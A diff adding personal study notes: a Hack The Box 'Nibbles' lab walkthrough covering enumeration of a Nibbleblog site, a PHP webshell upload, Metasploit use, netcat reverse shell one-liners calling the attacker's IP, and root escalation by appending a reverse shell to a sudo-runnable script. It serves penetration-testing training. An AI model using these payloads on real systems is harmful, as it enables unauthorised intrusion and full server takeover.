@@ -1019,4 +1019,507 @@ Run an nmap script scan on the target. What is the Apache version running on the
 
 `nmap -sV -sC -Pn 10.129.10.160`
 
+We can use whatweb to try to identify the web application in use.
+
+```
+whatweb 10.129.42.190
+
+http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
+```
+
+This tool does not identify any standard web technologies in use. Browsing to the target in Firefox shows us a simple "Hello world!" message.
+
+Checking the page source reveals an interesting comment.
+
+```
+curl http://10.129.42.190
+
+<b>Hello world!</b>
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+```
+
+The HTML comment mentions a directory named nibbleblog. Let us check this with whatweb.
+
+```
+whatweb http://10.129.42.190/nibbleblog
+
+http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
+http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
+
+```
+
+Now we are starting to get a better picture of things. We can see some of the technologies in use such as HTML5, jQuery, and PHP. We can also see that the site is running Nibbleblog, which is a free blogging engine built using PHP.
+
+Browsing to the /nibbleblog directory in Firefox, we do not see anything exciting on the main page.
+
+image
+
+A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the Metasploit module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at /admin.php.
+
+Let us use Gobuster to be thorough and check for any other accessible pages/directories.
+
+```
+gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+
+===============================================================
+
+Gobuster v3.0.1
+
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+
+[+] Url:            http://10.129.42.190/nibbleblog/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/17 00:10:47 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/content (Status: 301)
+/index.php (Status: 200)
+/languages (Status: 301)
+/plugins (Status: 301)
+/README (Status: 200)
+/themes (Status: 301)
+===============================================================
+2020/12/17 00:11:38 Finished
+===============================================================
+```
+
+Gobuster finishes very quickly and confirms the presence of the admin.php page. We can check the README page for interesting information, such as the version number.
+
+```
+curl http://10.129.42.190/nibbleblog/README
+
+====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+
+Site: http://www.nibbleblog.com
+Blog: http://blog.nibbleblog.com
+Help & Support: http://forum.nibbleblog.com
+Documentation: http://docs.nibbleblog.com
+
+===== Social =====
+
+* Twitter: http://twitter.com/nibbleblog
+* Facebook: http://www.facebook.com/nibbleblog
+* Google+: http://google.com/+nibbleblog
+
+===== System Requirements =====
+
+* PHP v5.2 or higher
+* PHP module - DOM
+* PHP module - SimpleXML
+* PHP module - GD
+* Directory “content” writable by Apache/PHP
+```
+
+So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the Metasploit module (though this could be an old README page). Nothing else interesting pops out at us. Let us check out the admin portal login page.
+
+Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as admin:admin and admin:password, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message Nibbleblog security error - Blacklist protection.
+
+Let us go back to our directory brute-forcing results. The 200 status codes show pages/directories that are directly accessible. The 403 status codes in the output indicate that access to these resources is forbidden. Finally, the 301 is a permanent redirect. Let us explore each of these. Browsing to nibbleblog/themes/. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around?
+
+Browsing to nibbleblog/content shows some interesting subdirectories public, private, and tmp. Digging around for a while, we find a users.xml file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using xmllint.
+
+```
+curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<users>
+  <user username="admin">
+    <id type="integer">0</id>
+    <session_fail_count type="integer">2</session_fail_count>
+    <session_date type="integer">1608182184</session_date>
+  </user>
+  <blacklist type="string" ip="10.10.10.1">
+    <date type="integer">1512964659</date>
+    <fail_count type="integer">1</fail_count>
+  </blacklist>
+  <blacklist type="string" ip="10.10.14.2">
+    <date type="integer">1608182171</date>
+    <fail_count type="integer">5</fail_count>
+  </blacklist>
+</users>
+```
+
+At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:
+
+    A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
+
+    An admin portal at nibbleblog/admin.php
+
+    Directory listing which confirmed that admin is a valid username
+
+    Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table
+
+
+There are no other ports open, and we did not find any other directories. Which we can confirm by performing additional directory brute-forcing against the root of the web application
+
+```
+gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.129.42.190/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/17 00:36:55 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/12/17 00:37:46 Finished
+===============================================================
+```
+Taking another look through all of the exposed directories, we find a config.xml file.
+
+```
+curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<config>
+  <name type="string">Nibbles</name>
+  <slogan type="string">Yum yum</slogan>
+  <footer type="string">Powered by Nibbleblog</footer>
+  <advanced_post_options type="integer">0</advanced_post_options>
+  <url type="string">http://10.129.42.190/nibbleblog/</url>
+  <path type="string">/nibbleblog/</path>
+  <items_rss type="integer">4</items_rss>
+  <items_page type="integer">6</items_page>
+  <language type="string">en_US</language>
+  <timezone type="string">UTC</timezone>
+  <timestamp_format type="string">%d %B, %Y</timestamp_format>
+  <locale type="string">en_US</locale>
+  <img_resize type="integer">1</img_resize>
+  <img_resize_width type="integer">1000</img_resize_width>
+  <img_resize_height type="integer">600</img_resize_height>
+  <img_resize_quality type="integer">100</img_resize_quality>
+  <img_resize_option type="string">auto</img_resize_option>
+  <img_thumbnail type="integer">1</img_thumbnail>
+  <img_thumbnail_width type="integer">190</img_thumbnail_width>
+  <img_thumbnail_height type="integer">190</img_thumbnail_height>
+  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
+  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
+  <theme type="string">simpler</theme>
+  <notification_comments type="integer">1</notification_comments>
+  <notification_session_fail type="integer">0</notification_session_fail>
+  <notification_session_start type="integer">0</notification_session_start>
+  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
+  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
+  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
+  <seo_site_description type="string"/>
+  <seo_keywords type="string"/>
+  <seo_robots type="string"/>
+  <seo_google_code type="string"/>
+  <seo_bing_code type="string"/>
+  <seo_author type="string"/>
+  <friendly_urls type="integer">0</friendly_urls>
+  <default_homepage type="integer">0</default_homepage>
+</config>
+```
+
+Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?
+
+When performing password cracking offline with a tool such as Hashcat or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as CeWL.
+
+This shows us how crucial thorough enumeration is. Let us recap what we have found so far:
+
+    We started with a simple nmap scan showing two open ports
+
+    Discovered an instance of Nibbleblog
+
+    Analyzed the technologies in use using whatweb
+
+    Found the admin login portal page at admin.php
+
+    Discovered that directory listing is enabled and browsed several directories
+
+    Confirmed that admin was the valid username
+
+    Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
+
+    Uncovered clues that led us to a valid admin password of nibbles
+
+This proves that we need a clear, repeatable process that we will use time and time again, no matter if we are attacking a single box on HTB, performing a web application penetration test for a client, or attacking a large Active Directory environment. Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field. As you progress in your career, you will often marvel at how the initial scope of a penetration test seemed extremely small and "boring," yet once you dig in and perform rounds and rounds of enumeration and peel back the layers, you may find an exposed service on a high port or some forgotten page or directory that can lead to sensitive data exposure or even a foothold.
+
+Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a Metasploit module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:
+
+Publish 	making a new post, video post, quote post, or new page. It could be interesting.
+Comments 	shows no published comments
+Manage 	Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.
+Settings 	Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.
+Themes 	This Allows us to install a new theme from a pre-selected list.
+Plugins 	Allows us to configure, install, or uninstall plugins. The My image plugin allows us to upload an image file. Could this be abused to upload PHP code potentially?
+
+Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.
+
+Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.
+
+``` php
+<?php system('id'); ?>
+```
+
+Save this code to a file and then click on the Browse button and upload it.
+
+We get a bunch of errors, but it seems like the file may have uploaded.
+
+```
+Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+
+Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
+
+Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
+
+Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
+
+Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
+
+Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
+
+```
+
+Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the /content directory. Under this, there is a plugins directory and another subdirectory for my_image. The full path is at http://<host>/nibbleblog/content/private/plugins/my_image/. In this directory, we see two files, db.xml and image.php, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
+
+```
+curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
+
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the nibbler user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.
+
+Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are PayloadAllTheThings and HighOn,Coffee.
+
+Let us use the following Bash reverse shell one-liner and add it to our PHP script.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+```
+
+We will add our tun0 VPN IP address in the <ATTACKING IP> placeholder and a port of our choice for <LISTENING PORT> to catch the reverse shell on our netcat listener. See the edited PHP script below.
+
+``` php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+```
+
+We upload the file again and start a netcat listener in our terminal:
+
+```
+nc -lvnp 9443
+
+listening on [any] 9443 ...
+```
+
+cURL the image page again or browse to it in Firefox at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
+
+```
+nc -lvnp 9443
+
+listening on [any] 9443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as su will not work, we cannot use text editors, tab-completion does not work, etc. This post explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a Python one-liner to spawn a pseudo-terminal so commands such as su and sudo work as discussed previously in this Module.
+
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+``` bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as Python2 seems to be missing from the system!
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+/bin/sh: 3: python: not found
+
+$ which python3
+
+/usr/bin/python3
+```
+
+We have Python3 though, which works to get us to a friendlier shell by typing python3 -c 'import pty; pty.spawn("/bin/bash")'. Browsing to /home/nibbler, we find the user.txt flag as well as a zip file personal.zip.
+
+```
+nibbler@Nibbles:/home/nibbler$ ls
+
+ls
+personal.zip  user.txt
+```
+
+-----------------------
+
+Gain a foothold on the target and submit the user.txt flag
+
+
+This was very confusing for me. First, it wouldn't let me connect to the /nibbleblog/
+
+Then just out of nowhere it did.
+
+Once I finally got in, I did this.
+
+```
+
+msfconsole # start metasploit
+
+use exploit/multi/http/nibbleblog_file_upload
+
+set TARGET 0
+show options
+set RHOSTS 10.129.170.213
+
+set LHOST 10.10.14.250
+set LPORT 4444
+
+exploit # the netcat has to happen before this
+
+shell # Opens shell
+python3 -c 'import pty; pty.spawn("/bin/bash")' # creats pretty shell
+```
+
+And in another window I ran
+
+```
+nc -nvlp 4444
+```
+
+That got me a reverse shell that let me find the user.txt file.
+
+
+# Priv Esc
+
+Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the personal.zip file and see a file called monitor.sh.
+
+```
+nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+
+unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh 
+```
+
+The shell script monitor.sh is a monitoring script, and it is owned by our nibbler user and writeable.
+
+```
+cat monitor.sh
+
+cat monitor.sh
+                 ####################################################################################################
+
+                 #                                        Tecmint_monitor.sh                                        #
+
+                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+
+                 # If any bug, report us in the link below                                                          #
+
+                 # Free to use/edit/distribute the code below by                                                    #
+
+                 # giving proper credit to Tecmint.com and Author                                                   #
+
+                 #                                                                                                  #
+
+                 ####################################################################################################
+
+#! /bin/bash
+
+# unset any variable which system may be using
+
+# clear the screen
+
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+       case $name in
+         i)iopt=1;;
+         v)vopt=1;;
+         *)echo "Invalid arg";;
+       esac
+done
+```
+
+Says to get linPeas on the box, don't feel like it but here are the steps.
+
+Let us put this aside for now and pull in LinEnum.sh to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command sudo python3 -m http.server 8080.
+
+```
+sudo python3 -m http.server 8080
+[sudo] password for ben: ***********
+
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
+```
+
+Back on the target type wget http://<your ip>:8080/LinEnum.sh to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type chmod +x LinEnum.sh to make the script executable and then type ./LinEnum.sh to run it. We see a ton of interesting output but what immediately catches the eye are sudo privileges.
+
+```
+We can sudo without supplying a password!
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+
+[+] Possible sudo pwnage!
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+
+The nibbler user can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user. Let us edit the monitor.sh file to append a reverse shell one-liner.
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
+
+
+If we cat the monitor.sh file, we will see the contents appended to the end. It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption. Execute the script with sudo:
+
+```
+sudo /home/nibbler/personal/stuff/monitor.sh 
+```
+
+Finally, catch the root shell on our waiting nc listener.
+
+```
+nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+From here, we can grab the root.txt flag. Finally, we have now solved our first box on HTB. Try to replicate all of the steps on your own. Try various tools to achieve the same effect. We can use many different tools for the various steps required to solve this box. This walkthrough shows one possible method. Make sure to take detailed notes to practice that vital skillset.
+
+This all gets me the root file
+
 
